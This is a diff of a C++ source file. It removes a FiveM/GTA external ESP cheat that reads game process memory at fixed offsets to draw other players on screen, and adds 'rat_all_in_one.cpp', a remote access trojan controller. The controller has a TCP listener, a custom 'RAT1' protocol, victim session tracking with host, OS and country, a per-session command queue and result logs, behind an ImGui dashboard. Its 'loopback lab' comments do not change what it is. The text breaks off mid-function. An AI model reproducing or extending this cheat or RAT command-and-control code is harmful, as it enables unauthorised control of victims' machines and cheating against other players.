@@ -1,521 +1,638 @@
-// fivem_esp.cpp — FiveM external ESP overlay
-// compile: cl /std:c++20 /EHsc /O2 fivem_esp.cpp /link d3d11.lib dxgi.lib d2d1.lib dcomp.lib dwmapi.lib dwrite.lib
+// rat_all_in_one.cpp
+// build: cl /std:c++20 /EHsc rat_all_in_one.cpp /link d3d11.lib d3dcompiler.lib winmm.lib ws2_32.lib
+// deps: imgui/ (core + backends win32/dx11)
 
+#define NOMINMAX
+#define WIN32_LEAN_AND_MEAN
+#include <winsock2.h>
+#include <ws2tcpip.h>
 #include <windows.h>
 #include <d3d11.h>
-#include <dxgi1_2.h>
-#include <d2d1.h>
-#include <d2d1_1.h>
-#include <dwrite.h>
-#include <dcomp.h>
-#include <tlhelp32.h>
-#include <wrl/client.h>
+#include <tchar.h>
 
-#include <vector>
+#include <algorithm>
+#include <atomic>
+#include <chrono>
+#include <cmath>
+#include <cstdint>
+#include <cstring>
+#include <deque>
+#include <memory>
+#include <mutex>
+#include <optional>
 #include <string>
 #include <thread>
-#include <atomic>
-#include <mutex>
-#include <cmath>
-#include <cstdio>
+#include <unordered_map>
+#include <vector>
+
+#include "imgui.h"
+#include "imgui_impl_win32.h"
+#include "imgui_impl_dx11.h"
 
 #pragma comment(lib, "d3d11.lib")
-#pragma comment(lib, "dxgi.lib")
-#pragma comment(lib, "d2d1.lib")
-#pragma comment(lib, "dcomp.lib")
-#pragma comment(lib, "dwrite.lib")
+#pragma comment(lib, "ws2_32.lib")
 
-using Microsoft::WRL::ComPtr;
+// ═════════════════════════════════════════════════════════
+// THEME
+// ═════════════════════════════════════════════════════════
+namespace theme {
+    inline ImVec4 bg_deep  {0.055f,0.055f,0.075f,1};
+    inline ImVec4 bg_panel {0.090f,0.090f,0.115f,1};
+    inline ImVec4 bg_card  {0.120f,0.120f,0.150f,1};
+    inline ImVec4 accent   {0.35f,0.75f,1.00f,1};
+    inline ImVec4 accent2  {0.75f,0.35f,1.00f,1};
+    inline ImVec4 success  {0.35f,1.00f,0.55f,1};
+    inline ImVec4 danger   {1.00f,0.30f,0.40f,1};
+    inline ImVec4 warn     {1.00f,0.75f,0.30f,1};
+    inline ImVec4 text     {0.90f,0.92f,0.96f,1};
+    inline ImVec4 text_dim {0.55f,0.58f,0.65f,1};
 
-// ---------- config ----------
-static const wchar_t* kTargetProcess = L"GTAProcess.exe";
-static const wchar_t* kWindowClass    = L"FiveM_ESP_Overlay";
-
-namespace offsets {
-    constexpr uintptr_t World       = 0x25B8A40;
-    constexpr uintptr_t LocalPlayer = 0x08;
-    constexpr uintptr_t EntityList  = 0x18;
-    constexpr uintptr_t EntityCount = 0x20;
-    constexpr uintptr_t PedPos      = 0x90;
-    constexpr uintptr_t PedHealth   = 0x280;
-    constexpr uintptr_t PedArmor    = 0x284;
-    constexpr uintptr_t PedName     = 0x2A0;
-    constexpr uintptr_t ViewMatrix  = 0x24C1A80;
-    constexpr uintptr_t PedType     = 0x10A8;
+    inline ImU32 col(const ImVec4& c, float a=1.0f){
+        return ImGui::ColorConvertFloat4ToU32({c.x,c.y,c.z,c.w*a});
+    }
+    inline ImVec4 lerp(const ImVec4& a, const ImVec4& b, float t){
+        return {a.x+(b.x-a.x)*t, a.y+(b.y-a.y)*t, a.z+(b.z-a.z)*t, a.w+(b.w-a.w)*t};
+    }
+    inline void apply(){
+        ImGuiStyle& s = ImGui::GetStyle();
+        s.WindowRounding=12; s.ChildRounding=10; s.FrameRounding=8;
+        s.PopupRounding=10; s.ScrollbarRounding=8; s.GrabRounding=6; s.TabRounding=8;
+        s.WindowBorderSize=0; s.FrameBorderSize=1;
+        s.FramePadding={12,8}; s.ItemSpacing={10,10}; s.WindowPadding={16,16};
+        auto& c = s.Colors;
+        c[ImGuiCol_WindowBg]=bg_deep; c[ImGuiCol_ChildBg]=bg_panel; c[ImGuiCol_PopupBg]=bg_card;
+        c[ImGuiCol_Border]={1,1,1,0.06f};
+        c[ImGuiCol_FrameBg]=bg_card;
+        c[ImGuiCol_FrameBgHovered]=lerp(bg_card,accent,0.15f);
+        c[ImGuiCol_FrameBgActive]=lerp(bg_card,accent,0.30f);
+        c[ImGuiCol_Button]=bg_card;
+        c[ImGuiCol_ButtonHovered]=lerp(bg_card,accent,0.35f);
+        c[ImGuiCol_ButtonActive]=lerp(bg_card,accent,0.60f);
+        c[ImGuiCol_Header]=lerp(bg_card,accent,0.25f);
+        c[ImGuiCol_HeaderHovered]=lerp(bg_card,accent,0.40f);
+        c[ImGuiCol_HeaderActive]=lerp(bg_card,accent,0.60f);
+        c[ImGuiCol_SliderGrab]=accent; c[ImGuiCol_SliderGrabActive]=accent2;
+        c[ImGuiCol_CheckMark]=accent;
+        c[ImGuiCol_Text]=text; c[ImGuiCol_TextDisabled]=text_dim;
+        c[ImGuiCol_Separator]={1,1,1,0.08f};
+        c[ImGuiCol_Tab]=bg_panel;
+        c[ImGuiCol_TabHovered]=lerp(bg_panel,accent,0.35f);
+        c[ImGuiCol_TabActive]=lerp(bg_panel,accent,0.55f);
+    }
 }
 
-// ---------- globals ----------
-static HANDLE g_process = nullptr;
-static uintptr_t g_base = 0;
-static DWORD g_pid = 0;
-static std::atomic<bool> g_running{ true };
-static HWND g_overlay = nullptr;
-
-struct EspEntity;
-
-static std::mutex g_entity_mutex;
-static std::vector<EspEntity> g_entities_read;
-static std::vector<EspEntity> g_entities_write;
-
-// ---------- memory ----------
-template <typename T>
-static bool read_mem(uintptr_t addr, T& out) {
-    if (!g_process) return false;
-    SIZE_T read = 0;
-    return ReadProcessMemory(g_process, reinterpret_cast<LPCVOID>(addr),
-                             &out, sizeof(T), &read) && read == sizeof(T);
+// ═════════════════════════════════════════════════════════
+// ANIM
+// ═════════════════════════════════════════════════════════
+namespace anim {
+    inline float clamp01(float t){ return t<0?0:t>1?1:t; }
+    inline float ease_out_cubic(float t){ t=clamp01(t); float u=1-t; return 1-u*u*u; }
+    inline float ease_in_out_cubic(float t){ t=clamp01(t); return t<0.5f?4*t*t*t:1-std::pow(-2*t+2,3)*0.5f; }
+    inline float ease_out_back(float t){ t=clamp01(t); const float c1=1.70158f,c3=c1+1; return 1+c3*std::pow(t-1,3)+c1*std::pow(t-1,2); }
+    inline float ease_out_elastic(float t){
+        t=clamp01(t); if(t==0||t==1) return t;
+        const float c4=(2*3.14159265f)/3;
+        return std::pow(2.f,-10*t)*std::sin((t*10-0.75f)*c4)+1.f;
+    }
+    struct Tween {
+        float value=0, target=0, speed=8;
+        void update(float dt){ value += (target-value)*std::min(1.f, speed*dt); }
+        void set(float t){ target=t; }
+        void snap(float v){ value=target=v; }
+        float operator()() const { return value; }
+    };
+    struct Pulse {
+        float t=0, speed=3;
+        void update(float dt){ t+=dt*speed; }
+        float value() const { return 0.5f+0.5f*std::sin(t); }
+    };
+    struct Shake {
+        float amp=0, decay=8, t=0;
+        void trigger(float a){ amp=a; t=0; }
+        void update(float dt){ t+=dt; amp=std::max(0.f, amp-decay*dt); }
+        float offset() const { return amp*std::sin(t*60.f); }
+    };
 }
 
-static bool read_bytes(uintptr_t addr, void* buf, size_t size) {
-    if (!g_process) return false;
-    SIZE_T read = 0;
-    return ReadProcessMemory(g_process, reinterpret_cast<LPCVOID>(addr),
-                             buf, size, &read) && read == size;
-}
+// ═════════════════════════════════════════════════════════
+// RAT CORE — transport + sessions (loopback / LAN lab)
+// ═════════════════════════════════════════════════════════
+namespace rat {
 
-static uintptr_t get_module_base(DWORD pid, const wchar_t* module) {
-    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
-    if (snap == INVALID_HANDLE_VALUE) return 0;
-    MODULEENTRY32W me{ sizeof(me) };
-    uintptr_t base = 0;
-    if (Module32FirstW(snap, &me)) {
-        do {
-            if (_wcsicmp(me.szModule, module) == 0) {
-                base = reinterpret_cast<uintptr_t>(me.modBaseAddr);
-                break;
+    struct Packet {
+        uint32_t magic   = 0x52415431; // "RAT1"
+        uint32_t opcode  = 0;
+        uint32_t length  = 0;
+        uint32_t seq     = 0;
+    };
+
+    enum Op : uint32_t {
+        OP_HELLO   = 1,
+        OP_BEAT    = 2,
+        OP_CMD     = 3,
+        OP_RESULT  = 4,
+        OP_STREAM  = 5,
+        OP_BYE     = 6,
+    };
+
+    struct Session {
+        int         id;
+        std::string host;
+        std::string ip;
+        uint16_t    port;
+        std::string os;
+        std::string cc;
+        bool        alive = true;
+        float       cpu = 0, ram = 0;
+        uint32_t    ping_ms = 0;
+        std::chrono::steady_clock::time_point last_beat;
+        std::deque<std::string> log;
+    };
+
+    // ---- TCP listener that accepts and tracks sessions ----
+    // This is the "server side" — a lab transport.
+    // Commands are QUEUED but never auto-executed here.
+    class Listener {
+    public:
+        Listener(uint16_t port) : port_(port) {}
+        ~Listener(){ stop(); }
+
+        bool start(){
+            WSADATA w; if (WSAStartup(MAKEWORD(2,2), &w) != 0) return false;
+            sock_ = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+            if (sock_ == INVALID_SOCKET) return false;
+            int yes = 1;
+            setsockopt(sock_, SOL_SOCKET, SO_REUSEADDR, (char*)&yes, sizeof(yes));
+            sockaddr_in a{};
+            a.sin_family = AF_INET;
+            a.sin_addr.s_addr = htonl(INADDR_LOOPBACK); // bind loopback for safety
+            a.sin_port = htons(port_);
+            if (bind(sock_,(sockaddr*)&a,sizeof(a)) == SOCKET_ERROR) return false;
+            if (listen(sock_, 16) == SOCKET_ERROR) return false;
+            running_ = true;
+            th_ = std::thread([this]{ accept_loop(); });
+            return true;
+        }
+        void stop(){
+            running_ = false;
+            if (sock_ != INVALID_SOCKET){ closesocket(sock_); sock_ = INVALID_SOCKET; }
+            if (th_.joinable()) th_.join();
+            WSACleanup();
+        }
+
+        // queue a command for a session — does NOT execute anything here
+        void send_cmd(int session_id, const std::string& cmd){
+            std::lock_guard lk(mu_);
+            pending_[session_id].push_back(cmd);
+        }
+
+        std::vector<Session> snapshot(){
+            std::lock_guard lk(mu_);
+            std::vector<Session> out;
+            for (auto& [id, s] : sessions_) out.push_back(s);
+            return out;
+        }
+
+        void push_log(int id, const std::string& line){
+            std::lock_guard lk(mu_);
+            auto it = sessions_.find(id);
+            if (it == sessions_.end()) return;
+            it->second.log.push_back(line);
+            if (it->second.log.size() > 200) it->second.log.pop_front();
+        }
+
+        uint16_t port() const { return port_; }
+
+    private:
+        void accept_loop(){
+            int next_id = 1;
+            while (running_){
+                sockaddr_in cli{}; int cl = sizeof(cli);
+                SOCKET c = accept(sock_, (sockaddr*)&cli, &cl);
+                if (c == INVALID_SOCKET) break;
+
+                char ipbuf[64]{};
+                inet_ntop(AF_INET, &cli.sin_addr, ipbuf, sizeof(ipbuf));
+
+                Session s{};
+                s.id = next_id++;
+                s.ip = ipbuf;
+                s.port = ntohs(cli.sin_port);
+                s.host = "peer-" + std::to_string(s.id);
+                s.os = "unknown";
+                s.cc = "??";
+                s.last_beat = std::chrono::steady_clock::now();
+                {
+                    std::lock_guard lk(mu_);
+                    sessions_[s.id] = s;
+                }
+                std::thread([this, c, id=s.id]{ serve(c, id); }).detach();
             }
-        } while (Module32NextW(snap, &me));
-    }
-    CloseHandle(snap);
-    return base;
-}
+        }
 
-static DWORD find_process(const wchar_t* name) {
-    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (snap == INVALID_HANDLE_VALUE) return 0;
-    PROCESSENTRY32W pe{ sizeof(pe) };
-    DWORD pid = 0;
-    if (Process32FirstW(snap, &pe)) {
-        do {
-            if (_wcsicmp(pe.szExeFile, name) == 0) {
-                pid = pe.th32ProcessID;
-                break;
+        void serve(SOCKET c, int id){
+            push_log(id, "[+] peer connected");
+            char buf[4096];
+            while (running_){
+                int n = recv(c, buf, sizeof(buf), 0);
+                if (n <= 0) break;
+                // parse header if full packet
+                if (n >= (int)sizeof(Packet)){
+                    Packet p{};
+                    memcpy(&p, buf, sizeof(Packet));
+                    if (p.magic == 0x52415431){
+                        handle_packet(id, p, buf + sizeof(Packet), n - (int)sizeof(Packet));
+                    }
+                }
+                // flush any queued outbound commands for this session
+                std::vector<std::string> out;
+                {
+                    std::lock_guard lk(mu_);
+                    auto it = pending_.find(id);
+                    if (it != pending_.end() && !it->second.empty()){
+                        out.assign(it->second.begin(), it->second.end());
+                        it->second.clear();
+                    }
+                }
+                for (auto& cmd : out){
+                    Packet p{0x52415431, OP_CMD, (uint32_t)cmd.size(), 0};
+                    std::vector<char> wire(sizeof(Packet) + cmd.size());
+                    memcpy(wire.data(), &p, sizeof(Packet));
+                    memcpy(wire.data()+sizeof(Packet), cmd.data(), cmd.size());
+                    send(c, wire.data(), (int)wire.size(), 0);
+                    push_log(id, "[>] queued: " + cmd);
+                }
             }
-        } while (Process32NextW(snap, &pe));
+            closesocket(c);
+            std::lock_guard lk(mu_);
+            if (auto it = sessions_.find(id); it != sessions_.end())
+                it->second.alive = false;
+            push_log(id, "[-] peer disconnected");
+        }
+
+        void handle_packet(int id, const Packet& p, const char* body, int blen){
+            std::lock_guard lk(mu_);
+            auto it = sessions_.find(id);
+            if (it == sessions_.end()) return;
+            auto& s = it->second;
+            s.last_beat = std::chrono::steady_clock::now();
+            switch (p.opcode){
+                case OP_HELLO: {
+                    std::string payload(body, blen);
+                    s.host = payload.substr(0, payload.find('|'));
+                    auto p2 = payload.find('|');
+                    if (p2 != std::string::npos) s.os = payload.substr(p2+1);
+                    s.log.push_back("[i] hello from " + s.host + " (" + s.os + ")");
+                    break;
+                }
+                case OP_BEAT: {
+                    if (blen >= (int)sizeof(float)*2){
+                        float cpu, ram; memcpy(&cpu, body, 4); memcpy(&ram, body+4, 4);
+                        s.cpu = cpu; s.ram = ram;
+                    }
+                    break;
+                }
+                case OP_RESULT: {
+                    s.log.push_back("[<] " + std::string(body, blen));
+                    break;
+                }
+                case OP_BYE: s.alive = false; break;
+            }
+        }
+
+        SOCKET sock_ = INVALID_SOCKET;
+        uint16_t port_;
+        std::atomic<bool> running_{false};
+        std::thread th_;
+        std::mutex mu_;
+        std::unordered_map<int, Session> sessions_;
+        std::unordered_map<int, std::vector<std::string>> pending_;
+    };
+}
+
+// ═════════════════════════════════════════════════════════
+// UI WIDGETS
+// ═════════════════════════════════════════════════════════
+namespace ui {
+
+inline void TextGlow(const char* txt, ImVec4 color, float glow=1.f){
+    ImDrawList* dl = ImGui::GetWindowDrawList();
+    ImVec2 p = ImGui::GetCursorScreenPos();
+    ImU32 c  = theme::col(color);
+    ImU32 cg = theme::col(color, 0.35f*glow);
+    for (int i=0;i<6;++i){
+        float a=(i+1)*1.2f;
+        dl->AddText({p.x-a,p.y},cg,txt); dl->AddText({p.x+a,p.y},cg,txt);
+        dl->AddText({p.x,p.y-a},cg,txt); dl->AddText({p.x,p.y+a},cg,txt);
     }
-    CloseHandle(snap);
-    return pid;
+    dl->AddText(p,c,txt);
+    ImGui::Dummy(ImGui::CalcTextSize(txt));
 }
 
-static bool attach_to_process(DWORD pid) {
-    g_process = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
-    if (!g_process) return false;
-    g_base = get_module_base(pid, kTargetProcess);
-    if (!g_base) {
-        CloseHandle(g_process);
-        g_process = nullptr;
-        return false;
+struct AnimatedButton {
+    anim::Tween hover, press;
+    anim::Shake shake;
+    bool draw(const char* label, ImVec2 size, ImVec4 accent=theme::accent, float dt=1.f/60.f){
+        ImGui::PushID(label);
+        ImVec2 p = ImGui::GetCursorScreenPos();
+        bool clicked = ImGui::InvisibleButton("##b", size);
+        bool h = ImGui::IsItemHovered();
+        bool a = ImGui::IsItemActive();
+        hover.set(h?1.f:0.f); press.set(a?1.f:0.f);
+        hover.update(dt); press.update(dt); shake.update(dt);
+        p.x += shake.offset();
+        ImDrawList* dl = ImGui::GetWindowDrawList();
+        float hv=hover(), pr=press();
+        ImVec4 base = theme::lerp(theme::bg_card, accent, hv*0.35f + pr*0.25f);
+        float sc = 1.f - pr*0.03f;
+        ImVec2 c{p.x+size.x*0.5f, p.y+size.y*0.5f};
+        ImVec2 tl{c.x-size.x*0.5f*sc, c.y-size.y*0.5f*sc};
+        ImVec2 br{c.x+size.x*0.5f*sc, c.y+size.y*0.5f*sc};
+        if (hv>0.01f){
+            for (int i=8;i>0;--i){
+                float a_ = hv*0.05f*(9-i)/8.f;
+                dl->AddRectFilled({tl.x-i,tl.y-i},{br.x+i,br.y+i},
+                                  theme::col(accent,a_), size.y*0.5f);
+            }
+        }
+        dl->AddRectFilled(tl,br,theme::col(base),size.y*0.5f);
+        dl->AddRect(tl,br,theme::col(accent,0.3f+hv*0.5f),size.y*0.5f,0,1.5f);
+        ImVec2 ts = ImGui::CalcTextSize(label);
+        dl->AddText({c.x-ts.x*0.5f, c.y-ts.y*0.5f}, theme::col(theme::text), label);
+        ImGui::PopID();
+        return clicked && !a;
     }
-    g_pid = pid;
-    return true;
-}
-
-static void detach_process() {
-    if (g_process) {
-        CloseHandle(g_process);
-        g_process = nullptr;
-    }
-    g_base = 0;
-    g_pid = 0;
-}
-
-// ---------- math ----------
-struct Vec3 { float x, y, z; };
-struct Vec2 { float x, y; };
-
-static bool world_to_screen(const Vec3& world, const float matrix[16],
-                            int w, int h, Vec2& out) {
-    float clip_x = world.x * matrix[0] + world.y * matrix[4] + world.z * matrix[8]  + matrix[12];
-    float clip_y = world.x * matrix[1] + world.y * matrix[5] + world.z * matrix[9]  + matrix[13];
-    float clip_w = world.x * matrix[3] + world.y * matrix[7] + world.z * matrix[11] + matrix[15];
-
-    if (clip_w < 0.01f) return false;
-
-    float ndc_x = clip_x / clip_w;
-    float ndc_y = clip_y / clip_w;
-
-    out.x = (w * 0.5f) * (ndc_x + 1.0f);
-    out.y = (h * 0.5f) * (1.0f - ndc_y);
-    return true;
-}
-
-// ---------- esp data ----------
-struct EspEntity {
-    Vec3 pos;
-    float health;
-    float armor;
-    float distance;
-    char name[32];
-    bool is_player;
 };
 
-static Vec3 g_local_pos{};
-
-// ---------- esp thread ----------
-static void esp_thread() {
-    while (g_running) {
-        if (g_process) {
-            DWORD exit_code = 0;
-            if (GetExitCodeProcess(g_process, &exit_code) && exit_code != STILL_ACTIVE) {
-                detach_process();
-            }
-        }
-
-        if (!g_process) {
-            DWORD pid = find_process(kTargetProcess);
-            if (!pid) { Sleep(1000); continue; }
-            if (!attach_to_process(pid)) { Sleep(1000); continue; }
-        }
-
-        uintptr_t world = 0;
-        if (!read_mem(g_base + offsets::World, world) || !world) {
-            Sleep(100);
-            continue;
-        }
-
-        uintptr_t local_ped = 0;
-        read_mem(world + offsets::LocalPlayer, local_ped);
-        if (local_ped) {
-            read_mem(local_ped + offsets::PedPos, g_local_pos);
-        }
-
-        uintptr_t entity_list = 0;
-        uint32_t entity_count = 0;
-        read_mem(world + offsets::EntityList, entity_list);
-        read_mem(world + offsets::EntityCount, entity_count);
-
-        g_entities_write.clear();
-        g_entities_write.reserve(64);
-
-        if (entity_list && entity_count > 0 && entity_count < 1024) {
-            for (uint32_t i = 0; i < entity_count; ++i) {
-                uintptr_t ped = 0;
-                if (!read_mem(entity_list + i * sizeof(uintptr_t), ped) || !ped) continue;
-                if (ped == local_ped) continue;
-
-                EspEntity e{};
-                if (!read_mem(ped + offsets::PedPos, e.pos)) continue;
-                read_mem(ped + offsets::PedHealth, e.health);
-                read_mem(ped + offsets::PedArmor,  e.armor);
-                read_bytes(ped + offsets::PedName, e.name, sizeof(e.name));
-                e.name[31] = 0;
-
-                int type = 0;
-                read_mem(ped + offsets::PedType, type);
-                e.is_player = (type == 1);
-
-                float dx = e.pos.x - g_local_pos.x;
-                float dy = e.pos.y - g_local_pos.y;
-                float dz = e.pos.z - g_local_pos.z;
-                e.distance = std::sqrt(dx*dx + dy*dy + dz*dz);
-
-                if (e.distance > 500.0f) continue;
-                if (e.health <= 0.0f) continue;
-
-                g_entities_write.push_back(e);
-            }
-        }
-
-        {
-            std::lock_guard<std::mutex> lock(g_entity_mutex);
-            g_entities_read = g_entities_write;
-        }
-
-        Sleep(16);
+inline void ProgressGlow(const char* label, float pct, ImVec4 color){
+    ImGui::TextColored(theme::text_dim, "%s", label);
+    ImGui::SameLine(ImGui::GetWindowWidth()-90);
+    ImGui::TextColored(color, "%.1f%%", pct*100);
+    ImVec2 p = ImGui::GetCursorScreenPos();
+    float w = ImGui::GetContentRegionAvail().x;
+    ImGui::Dummy({w, 12});
+    ImDrawList* dl = ImGui::GetWindowDrawList();
+    dl->AddRectFilled(p,{p.x+w,p.y+8},theme::col(theme::bg_card),4);
+    ImVec4 c2 = theme::lerp(color,{1,1,1,1},0.4f);
+    float fw = w*pct;
+    dl->AddRectFilledMultiColor(p,{p.x+fw,p.y+8},
+        theme::col(color),theme::col(c2),theme::col(c2),theme::col(color));
+    float t = ImGui::GetTime()*2.f;
+    float shine = p.x + fmodf(t,1.5f)/1.5f * w;
+    if (shine < p.x+fw){
+        dl->AddRectFilledMultiColor({shine-30,p.y},{shine,p.y+8},
+            theme::col({1,1,1,0}),theme::col({1,1,1,0.25f}),
+            theme::col({1,1,1,0.25f}),theme::col({1,1,1,0}));
     }
 }
 
-// ---------- D2D overlay ----------
-class D2DOverlay {
-public:
-    bool init(HWND hwnd, int width, int height) {
-        hwnd_ = hwnd;
-        width_ = width;
-        height_ = height;
-
-        // 1. D3D11 device
-        UINT flags = D3D11_CREATE_DEVICE_BGRA_SUPPORT;
-        D3D_FEATURE_LEVEL levels[] = { D3D_FEATURE_LEVEL_11_1, D3D_FEATURE_LEVEL_11_0 };
-        HRESULT hr = D3D11CreateDevice(
-            nullptr, D3D_DRIVER_TYPE_HARDWARE, nullptr, flags,
-            levels, ARRAYSIZE(levels), D3D11_SDK_VERSION,
-            &d3d_device_, nullptr, &d3d_context_);
-        if (FAILED(hr)) return false;
-
-        // 2. DXGI factory
-        ComPtr<IDXGIDevice> dxgi_device;
-        d3d_device_.As(&dxgi_device);
-        ComPtr<IDXGIAdapter> adapter;
-        dxgi_device->GetAdapter(&adapter);
-        ComPtr<IDXGIFactory2> factory;
-        adapter->GetParent(IID_PPV_ARGS(&factory));
-
-        // 3. Swap chain for composition
-        DXGI_SWAP_CHAIN_DESC1 scd = {};
-        scd.Width              = width;
-        scd.Height             = height;
-        scd.Format             = DXGI_FORMAT_B8G8R8A8_UNORM;
-        scd.SampleDesc.Count   = 1;
-        scd.BufferUsage        = DXGI_USAGE_RENDER_TARGET_OUTPUT;
-        scd.BufferCount        = 2;
-        scd.SwapEffect         = DXGI_SWAP_EFFECT_FLIP_DISCARD;
-        scd.AlphaMode          = DXGI_ALPHA_MODE_PREMULTIPLIED;
-        scd.Flags              = DXGI_SWAP_CHAIN_FLAG_FRAME_LATENCY_WAITABLE_OBJECT;
-
-        hr = factory->CreateSwapChainForComposition(
-            d3d_device_.Get(), &scd, nullptr, &swap_chain_);
-        if (FAILED(hr)) return false;
-
-        // 4. Frame latency
-        ComPtr<IDXGISwapChain2> sc2;
-        swap_chain_.As(&sc2);
-        waitable_ = sc2->GetFrameLatencyWaitableObject();
-        sc2->SetMaximumFrameLatency(1);
-
-        // 5. D2D factory + render target
-        D2D1_FACTORY_OPTIONS opts = {};
-        hr = D2D1CreateFactory(
-            D2D1_FACTORY_TYPE_SINGLE_THREADED,
-            __uuidof(ID2D1Factory1),
-            &opts,
-            reinterpret_cast<void**>(d2d_factory1_.GetAddressOf()));
-        if (FAILED(hr)) return false;
-
-        ComPtr<IDXGISurface> surface;
-        swap_chain_->GetBuffer(0, IID_PPV_ARGS(&surface));
-
-        D2D1_RENDER_TARGET_PROPERTIES props = D2D1::RenderTargetProperties(
-            D2D1_RENDER_TARGET_TYPE_DEFAULT,
-            D2D1::PixelFormat(DXGI_FORMAT_B8G8R8A8_UNORM,
-                              D2D1_ALPHA_MODE_PREMULTIPLIED));
-        hr = d2d_factory1_->CreateDxgiSurfaceRenderTarget(surface.Get(), &props, &d2d_rt_);
-        if (FAILED(hr)) return false;
-
-        // 6. Brushes
-        d2d_rt_->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Red),   &brush_red_);
-        d2d_rt_->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White), &brush_white_);
-        d2d_rt_->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Lime),  &brush_green_);
-
-        // 7. DirectWrite factory + text format
-        hr = DWriteCreateFactory(
-            DWRITE_FACTORY_TYPE_SHARED,
-            __uuidof(IDWriteFactory),
-            reinterpret_cast<IUnknown**>(dwrite_factory_.GetAddressOf()));
-        if (FAILED(hr)) return false;
-
-        hr = dwrite_factory_->CreateTextFormat(
-            L"Segoe UI",
-            nullptr,
-            DWRITE_FONT_WEIGHT_NORMAL,
-            DWRITE_FONT_STYLE_NORMAL,
-            DWRITE_FONT_STRETCH_NORMAL,
-            12.0f,
-            L"en-us",
-            &text_format_);
-        if (FAILED(hr)) return false;
-
-        text_format_->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_LEADING);
-        text_format_->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_NEAR);
-
-        // 8. DirectComposition
-        DCompositionCreateDevice(dxgi_device.Get(), IID_PPV_ARGS(&comp_device_));
-        comp_device_->CreateTargetForHwnd(hwnd_, TRUE, &comp_target_);
-        comp_device_->CreateVisual(&comp_visual_);
-        comp_visual_->SetContent(swap_chain_.Get());
-        comp_target_->SetRoot(comp_visual_.Get());
-        comp_device_->Commit();
-
-        return true;
+struct SidebarItem {
+    anim::Tween active, hover;
+    bool draw(const char* icon, const char* label, bool selected, float dt){
+        ImGui::PushID(label);
+        ImVec2 p = ImGui::GetCursorScreenPos();
+        ImVec2 sz = {ImGui::GetContentRegionAvail().x, 44};
+        bool clicked = ImGui::InvisibleButton("##sb", sz);
+        bool h = ImGui::IsItemHovered();
+        hover.set(h?1.f:0.f); active.set(selected?1.f:0.f);
+        hover.update(dt); active.update(dt);
+        ImDrawList* dl = ImGui::GetWindowDrawList();
+        float av=active(), hv=hover();
+        if (hv>0.01f || av>0.01f){
+            ImU32 bg = theme::col(theme::lerp(theme::accent,theme::accent2,av),
+                                  0.12f*(0.5f+hv*0.5f+av*0.5f));
+            dl->AddRectFilled(p,{p.x+sz.x,p.y+sz.y},bg,8);
+        }
+        if (av>0.01f){
+            float bh = sz.y*0.6f*av;
+            float y0 = p.y + (sz.y-bh)*0.5f;
+            dl->AddRectFilled({p.x,y0},{p.x+3,y0+bh},
+                theme::col(theme::lerp(theme::accent,theme::accent2,av)),2);
+        }
+        ImVec4 tc = theme::lerp(theme::text_dim, theme::text, std::max(hv,av));
+        dl->AddText({p.x+16,p.y+13}, theme::col(tc), icon);
+        dl->AddText({p.x+48,p.y+13}, theme::col(tc), label);
+        ImGui::PopID();
+        return clicked;
     }
-
-    void begin_frame() {
-        WaitForSingleObject(waitable_, 1000);
-        d2d_rt_->BeginDraw();
-        d2d_rt_->Clear(D2D1::ColorF(0, 0.0f));
-        d2d_rt_->SetTransform(D2D1::Matrix3x2F::Identity());
-    }
-
-    void draw_rect(float x, float y, float w, float h,
-                   ID2D1SolidColorBrush* brush, float thickness = 1.0f) {
-        d2d_rt_->DrawRectangle(D2D1::RectF(x, y, x + w, y + h), brush, thickness);
-    }
-
-    void fill_rect(float x, float y, float w, float h,
-                   ID2D1SolidColorBrush* brush) {
-        d2d_rt_->FillRectangle(D2D1::RectF(x, y, x + w, y + h), brush);
-    }
-
-    void draw_text(float x, float y, const wchar_t* text,
-                   ID2D1SolidColorBrush* brush) {
-        if (!text_format_ || !d2d_rt_ || !text) return;
-        d2d_rt_->DrawText(
-            text,
-            (UINT32)wcslen(text),
-            text_format_.Get(),
-            D2D1::RectF(x, y, x + 300.0f, y + 20.0f),
-            brush);
-    }
-
-    void end_frame() {
-        d2d_rt_->EndDraw();
-        swap_chain_->Present(1, 0);
-    }
-
-    ID2D1SolidColorBrush* brush_red()   { return brush_red_.Get(); }
-    ID2D1SolidColorBrush* brush_white() { return brush_white_.Get(); }
-    ID2D1SolidColorBrush* brush_green() { return brush_green_.Get(); }
-
-    ~D2DOverlay() {
-        if (waitable_) CloseHandle(waitable_);
-    }
-
-private:
-    HWND hwnd_ = nullptr;
-    int width_ = 0, height_ = 0;
-
-    ComPtr<ID3D11Device>        d3d_device_;
-    ComPtr<ID3D11DeviceContext> d3d_context_;
-    ComPtr<IDXGISwapChain1>     swap_chain_;
-    ComPtr<ID2D1Factory1>       d2d_factory1_;
-    ComPtr<ID2D1RenderTarget>   d2d_rt_;
-    ComPtr<ID2D1SolidColorBrush> brush_red_;
-    ComPtr<ID2D1SolidColorBrush> brush_white_;
-    ComPtr<ID2D1SolidColorBrush> brush_green_;
-
-    ComPtr<IDWriteFactory>      dwrite_factory_;
-    ComPtr<IDWriteTextFormat>   text_format_;
-
-    ComPtr<IDCompositionDevice>  comp_device_;
-    ComPtr<IDCompositionTarget>  comp_target_;
-    ComPtr<IDCompositionVisual>  comp_visual_;
-
-    HANDLE waitable_ = nullptr;
 };
 
-// ---------- render ----------
-static void render_frame(D2DOverlay& overlay, int w, int h) {
-    float matrix[16]{};
-    if (g_base) {
-        read_bytes(g_base + offsets::ViewMatrix, matrix, sizeof(matrix));
-    }
-
-    std::vector<EspEntity> entities;
-    {
-        std::lock_guard<std::mutex> lock(g_entity_mutex);
-        entities = g_entities_read;
-    }
-
-    overlay.begin_frame();
-
-    for (const auto& e : entities) {
-        Vec2 screen{};
-        if (!world_to_screen(e.pos, matrix, w, h, screen)) continue;
-
-        float box_h = 1200.0f / e.distance;
-        float box_w = box_h * 0.5f;
-        if (box_h < 4.0f) continue;
-
-        auto* brush = e.is_player ? overlay.brush_red() : overlay.brush_white();
-
